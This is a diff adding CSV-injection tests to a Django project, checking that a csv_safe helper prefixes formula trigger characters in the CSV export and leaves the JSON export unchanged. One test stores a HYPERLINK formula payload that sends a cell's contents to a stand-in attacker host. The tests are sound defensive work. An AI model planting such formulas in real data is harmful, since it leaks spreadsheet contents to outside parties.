@@ -27,6 +27,7 @@ from django.urls import reverse
 from django.utils import timezone
 
 from .models import Brief, BriefItem, Connection, Message, Person, Space
+from .views import csv_safe
 
 LIST_ROUTES = [
     "item-list-manual",        # 1. FBV, HttpResponse
@@ -499,3 +500,55 @@ class EmptyReportTests(TestCase):
         payload = self.client.get(reverse("export-items-json")).json()
         self.assertEqual(payload["record_count"], 0)
         self.assertEqual(payload["brief_items"], [])
+
+
+class CsvInjectionTests(TestCase):
+    """
+    The CSV export must not hand a spreadsheet something it will run as a formula.
+
+    The path is real rather than theoretical: the create form on /briefs/<pk>/ takes free text
+    and needs no login, so a stored title is attacker-controlled input that ends up in a file a
+    teammate opens in Excel.
+    """
+
+    @classmethod
+    def setUpTestData(cls):
+        cls.item = _build_demo_rows()
+
+    def test_a_stored_formula_is_neutralised_in_the_csv(self):
+        payload = '=HYPERLINK("http://evil.example/leak?c="&A1,"Click me")'
+        self.client.post(
+            self.item.brief.get_absolute_url(),
+            {"title": payload, "lane": "fyi", "rank": "77", "summary": "harmless"},
+        )
+        self.assertTrue(BriefItem.objects.filter(title=payload).exists())  # stored as typed
+
+        body = self.client.get(reverse("export-items-csv")).content.decode()
+        row = next(line for line in body.splitlines() if "HYPERLINK" in line)
+        cell = next(c for c in csv.reader(io.StringIO(row)))[1]
+        self.assertTrue(cell.startswith("'"), f"formula not neutralised: {cell!r}")
+        self.assertFalse(cell.startswith("="))
+
+    def test_every_formula_trigger_character_is_covered(self):
+        for lead in ("=", "+", "-", "@", "\t", "\r"):
+            with self.subTest(lead=lead):
+                self.assertEqual(csv_safe(lead + "danger"), "'" + lead + "danger")
+
+    def test_ordinary_values_are_left_exactly_as_they_are(self):
+        for value in ("Thesis draft", "Invoice #4471", "", None, 42):
+            with self.subTest(value=value):
+                self.assertEqual(csv_safe(value), value)
+
+    def test_the_json_export_is_not_mangled(self):
+        """JSON has no formula evaluator, so prefixing there would be data loss for no gain."""
+        payload = "=1+1"
+        self.client.post(
+            self.item.brief.get_absolute_url(),
+            {"title": payload, "lane": "fyi", "rank": "88", "summary": "harmless"},
+        )
+        payload_rows = [
+            row for row in self.client.get(reverse("export-items-json")).json()["brief_items"]
+            if row["title"].endswith("1+1")
+        ]
+        self.assertEqual(payload_rows[0]["title"], payload)
+
